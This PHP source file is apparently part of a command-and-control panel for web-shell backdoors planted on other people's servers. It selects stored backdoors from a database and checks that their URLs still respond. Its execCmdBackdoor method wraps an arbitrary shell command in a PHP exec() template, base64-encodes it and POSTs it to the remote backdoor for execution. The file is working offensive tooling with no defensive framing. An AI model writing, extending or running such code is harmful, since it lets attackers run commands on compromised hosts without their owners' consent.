<?php

namespace System\Backdoors;

use Database\Database;
use System\Configuration;
use System\Templates\Template;
use Classes\GlobalAction;

class Backdoor
{
    public static function selectBackdoor($identifier)
    {
        $bdd = Database::get_database();
        $select = $bdd->prepare("SELECT * FROM backdoor_list WHERE backdoor_identifier = :backdoor_identifier");
        $select->bindParam(':backdoor_identifier', $identifier);
        $select->execute();
        if($select->rowCount() < 1)
            return false;
        Database::insertBackdoorSelected($identifier);
        return true;
    }

    public static function pingBackdoor($identifier)
    {
        $information = Database::getCurrentBackdoorInformation($identifier);
        if($information !== false)
        {
            $headers = @get_headers($information->backdoor_url);
            if(strpos($headers[0],'200')===false)
                return false;
            return true;
        }
        return false;

    }

    public static function execCmdBackdoor($command)
    {
        $backdoor = Database::getCurrentBackdoorInformation(Database::backdoor_selected());
        if($backdoor !== false)
        {
            $template = '$row = exec("'.trim($command).'",$output,$error);
            while(list(,$row) = each($output)){
                echo $row."\n";
            }';
            $payload = base64_encode($template);
            $results = GlobalAction::sendPost($backdoor->backdoor_url, ['c' => $payload]);
            $autoGenerate = Database::getAutogenerate();
            if($autoGenerate && strtolower($autoGenerate->auto_generate) == 'activate')
                Template::generatePayloadTemplate('Executor');
            return $results;
        }
        return false;
    }
}